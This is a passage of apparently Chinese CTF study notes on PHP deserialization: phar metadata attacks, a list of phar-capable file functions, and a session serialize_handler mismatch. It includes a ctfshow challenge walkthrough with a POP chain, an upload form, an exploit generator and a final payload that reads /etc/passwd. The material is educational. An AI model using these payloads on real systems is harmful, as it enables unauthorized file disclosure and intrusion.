<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301291918762.png" alt="image-20230129191830604"></p>
<p>我们在包含的时候也可以不加<code>phar</code>后缀, 因为php文件没有后缀也是能读取的, like this<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292153134.png" alt="image-20230129215302039"></p>
<h4 id="phar是怎么反序列化的"><a href="#phar是怎么反序列化的" class="headerlink" title="phar是怎么反序列化的"></a>phar是怎么反序列化的</h4><blockquote>
<p>比方说这里有一个题目</p>
<p>文件上传， 但是不让上传php、ini、htaccess（黑名单）就可以尝试上传phar文件, phar文件里就有可能用到了<code>file_exists()</code>, 就可以利用反序列化</p>
</blockquote>
<p>phar的底层原理是c代码, 这里不再细看</p>
<p>当使用<code>phar::getMetadata</code>方法时, 会进行反序列化, 我们本地测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hack</span>();</span><br><span class="line"><span class="comment">//执行析构</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;flag.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">buildFromDirectory</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/project&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$h</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">setStub</span>(<span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">createDefaultStub</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>我们打开phar文件可以发现, 出现了序列化的strings<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292235095.png" alt="image-20230129223513002"></p>
<p>执行之后, 发现本地生成了<code>flag.phar</code>, 然后尝试<code>getMetadata</code>, 看看能否反序列化hack类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;flag.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">getMetadata</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292253400.png" alt="image-20230129225356303"></p>
<p>可以发现时成功反序列化hack类</p>
<p>那么有没有可以自动反序列化的方法呢, 当然有, 通过尝试, 我们发现<code>include</code>协议和<code>phar</code>协议都可以反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hack class destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;phar://flag.phar&#x27;</span>);</span><br><span class="line"><span class="comment">//include &#x27;flag.phar&#x27;;</span></span><br><span class="line"><span class="comment">//这里地址可以精确到/flag.phar/flag.php, 也可以只写到/flag.phar, 因为在index.php里用到了createDefaultStub缺省方法</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292256447.png" alt="image-20230129225621351"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292257459.png" alt="image-20230129225729348"></p>
<p>那么为什么这个协议就可以反序列化呢, 我们可以看一下php的<a href="https://github.com/php/php-src">源码</a>, 具体可以看<a href="https://github.com/php/php-src/blob/master/main/streams/streams.c">这里的1874行</a></p>
<p>能使用<code>phar伪协议</code>的地方,就能自动反序列化<code>metaData</code>里面的数据</p>
<p>具体哪些函数可以用<code>phar协议</code>这里做一个汇总, 可以说是比较全面的</p>
<table>
<thead>
<tr>
<th>fileatime</th>
<th>filectime</th>
<th>file_exists</th>
<th>file_get_contents</th>
<th>file_put_contents</th>
</tr>
</thead>
<tbody><tr>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
<td>fileinode</td>
<td>filemtime</td>
</tr>
<tr>
<td>fileowner</td>
<td>fileperms</td>
<td>fstat</td>
<td>fseek</td>
<td>is_dir</td>
</tr>
<tr>
<td>is_link</td>
<td>is_readable</td>
<td>is_writeable</td>
<td>is_writable</td>
<td>include</td>
</tr>
<tr>
<td>include_once</td>
<td>opendir</td>
<td>parse_ini_file</td>
<td>rmdir</td>
<td>require</td>
</tr>
<tr>
<td>require_once</td>
<td>readfile</td>
<td>stat</td>
<td>unlink</td>
<td>mkdir</td>
</tr>
<tr>
<td>copy</td>
<td>scandir</td>
<td>filesize</td>
<td>highlight_file</td>
<td>new DirectoryIterator</td>
</tr>
</tbody></table>
<p>两种情况下phar能够利用</p>
<ol>
<li>能够控制上传或者写入phar文件的情况下. 没有恶意类, 但是可以包含. 就会执行phar里面打包的php文件</li>
<li>有恶意类, 没有包含, 但是有文件操作函数, 可以控制phar协议头. 可以自动反序列化里面的metaData数据, 配合析构方法, 可能造成漏洞</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>phar中, 使用setmetaData函数可以保存任意可反序列化的变量以及类实例</li>
<li>文件操作函数中, 只要能控制协议头, 均可自动反序列化metaData的数据</li>
<li>文件包含的情况下, 可以直接执行里面的php文件中的php代码</li>
</ul>
<h2 id="第四节-session的反序列化"><a href="#第四节-session的反序列化" class="headerlink" title="第四节 session的反序列化"></a>第四节 session的反序列化</h2><h3 id="0x8-PHP中的session机制"><a href="#0x8-PHP中的session机制" class="headerlink" title="0x8 PHP中的session机制"></a>0x8 PHP中的session机制</h3><p>在<code>php.ini</code>有以下几个默认选项</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled = On</span><br><span class="line"><span class="comment">//表示upload_progress功能开启, 也意味着当浏览器向服务器上传一个文件时, php将会把此次文件上传的详细信息(如上传时间/上传进度等)存储在session中;</span></span><br><span class="line">session.upload_progress.cleanup = On</span><br><span class="line"><span class="comment">//表示当文件上传结束后, PHP将会立即清空对应的session文件中的内容, 这个选项非常重要;如果开启表示可能需要竞争, 如果不开启就不需要竞争</span></span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="comment">//prefix+name将表示为session中的键名</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment">//当name出现在表单中, PHP将会报告上传进度, 最大好处是 它的值可控</span></span><br><span class="line">session.upload_progress.freq =  <span class="string">&quot;1%&quot;</span></span><br><span class="line">session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里我们只需要了解前四个配置选项即可</p>
<h3 id="0x9-session处理handler引起的安全问题"><a href="#0x9-session处理handler引起的安全问题" class="headerlink" title="0x9 session处理handler引起的安全问题"></a>0x9 session处理handler引起的安全问题</h3><p>这里我们写两段PHP代码来本地实验一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$u</span>-&gt;name=<span class="string">&#x27;charmersix&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$u</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先我们来看一下本地<code>session.serialize_handler</code>的不同有什么影响, 这里我们再写一个<code>phpinfo</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//phpinfo.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302041919786.png" alt="image-20230204191912630"></p>
<p>可以看到原始的是<code>php</code>, 这里我们获取一下session试试, 我们可以在本地看到session内容<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302041922727.png" alt="image-20230204192254625"></p>
<p>然后我们换一个<code>handler</code></p>
<p>来到配置文件修改一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302041932948.png" alt="image-20230204193230833"></p>
<p>可以发现明显的不同<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302042341858.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini: session.serialize_handler = php</span><br><span class="line">session: user|O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Charmersix&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">ini:  session.serialize_handler = php_serialize</span><br><span class="line">session: a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Charmersix&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们存储的是<code>php_serialize</code>形式, 然后再用<code>php</code>这种形式去读取, 就会出现一个反序列化的情况.</p>
<p>比如这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Charmersix&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以把<code>|</code>后面的反序列化<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302050111775.png" alt="20200309232031-83c7666e-6219-1"></p>
<p>这里我们做一个题目试试, 由于这个题目曾经出现过<code>ctfshow</code>平台的年初挑战, 所以是可以免费出现的, 别的一些<code>ctfshow</code>会员题目由于担心侵权, 所以题目源码就尽量不会出现在我的文章里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$happy</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$happy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy=<span class="string">&quot;Happy_New_Year!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy-&gt;happy;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$funName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;happy;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_New_</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;daniu=<span class="string">&quot;I&#x27;m daniu.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;robot=<span class="string">&quot;I&#x27;m robot.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;notrobot=<span class="string">&quot;I&#x27;m not a robot.&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$funName</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu-&gt;<span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;notrobot;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$key</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;happy &quot;</span>.<span class="variable language_">$this</span>-&gt;zodiac.<span class="string">&quot; year!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;zodiac=<span class="string">&quot;Hu&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)#3</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;zodiac));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;zodiac = <span class="string">&#x27;hu&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里由于本人比较菜就参考一下官方的wp</p>
<p>思路:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.利用happy类的析构方法</span><br><span class="line">2.读取happy属性的happy属性, 会调用happy属性的__get方法</span><br><span class="line">    所以happy属性必须为new的实例</span><br><span class="line">3.__get方法会触发某个对象的__toString方法</span><br><span class="line">4.__toString方法触发Year类的show方法</span><br></pre></td></tr></table></figure>

<p>这里可以发现pop链:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Happy:<span class="title function_ invoke__">__destruct</span>()=&gt;_New_:<span class="title function_ invoke__">__get</span>()=&gt;_New_:<span class="title function_ invoke__">__toString</span>()=&gt;Year:<span class="title function_ invoke__">__toString</span>()=&gt;Year:<span class="title function_ invoke__">Show</span>()</span><br></pre></td></tr></table></figure>

<p>然后我们通过post传一下payload, 构造上传表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造<code>exp.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy=<span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu=<span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;daniu=<span class="keyword">new</span> <span class="title class_">Year</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;robot=<span class="string">&quot;zodiac&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;notrobot=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//$data = $_POST[&#x27;data&#x27;];</span></span><br><span class="line"><span class="comment">//unserialize($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy = <span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu = <span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu-&gt;daniu = <span class="keyword">new</span> <span class="title class_">Year</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu-&gt;robot = <span class="string">&quot;zodiac&quot;</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu-&gt;notrobot = <span class="string">&#x27;/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>));</span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Happy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;happy&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;_New_&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;daniu&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;_New_&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;daniu&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Year&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;zodiac&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;robot&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;zodiac&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;notrobot&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;/etc/passwd&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;robot&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;notrobot&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们需要在payload前加上<code>|</code>以及用<code>\</code>来转义<code>&quot;</code></p>
<p>最终payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|O:<span class="number">5</span>:\<span class="string">&quot;Happy\&quot;:1:&#123;s:5:\&quot;happy\&quot;;O:5:\&quot;_New_\&quot;:3:&#123;s:5:\&quot;daniu\&quot;;O:5:\&quot;_New_\&quot;:3:&#123;s:5:\&quot;daniu\&quot;;O:4:\&quot;Year\&quot;:1:&#123;s:6:\&quot;zodiac\&quot;;N;&#125;s:5:\&quot;robot\&quot;;s:6:\&quot;zodiac\&quot;;s:8:\&quot;notrobot\&quot;;s:11:\&quot;/etc/passwd\&quot;;&#125;s:5:\&quot;robot\&quot;;N;s:8:\&quot;notrobot\&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>发包, 们会发现他这里有一个<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302072206347.png" alt="image-20230207220632124"></p>
<p>所以我们需要把cookie补上, 成功<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302072207463.png" alt="image-20230207220718359"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_7_SSRF/JWT/XXE</title>
    <url>/2022/10/30/web_7_ssrf/</url>
    <content><![CDATA[<h2 id="第一节-SSRF的漏洞利用"><a href="#第一节-SSRF的漏洞利用" class="headerlink" title="第一节 SSRF的漏洞利用"></a>第一节 SSRF的漏洞利用</h2><h3 id="0x1-ssrf原理解析"><a href="#0x1-ssrf原理解析" class="headerlink" title="0x1 ssrf原理解析"></a>0x1 ssrf原理解析</h3><h4 id="什么是ssrf"><a href="#什么是ssrf" class="headerlink" title="什么是ssrf"></a>什么是ssrf</h4><blockquote>
<p>服务端请求伪造，攻击者向服务端发送包含恶意url链接的请求。ssrf常被用于探测攻击者无法访问的网络区域，比如内网或是防火墙访问限制的主机。</p>
</blockquote>
<p>控制服务器使用指定的协议(如http协议,file协议)</p>
<h5 id="ssrf原理"><a href="#ssrf原理" class="headerlink" title="ssrf原理"></a>ssrf原理</h5><p>ssrf漏洞攻击的目标主机是从外网无法直接访问的内部系统</p>
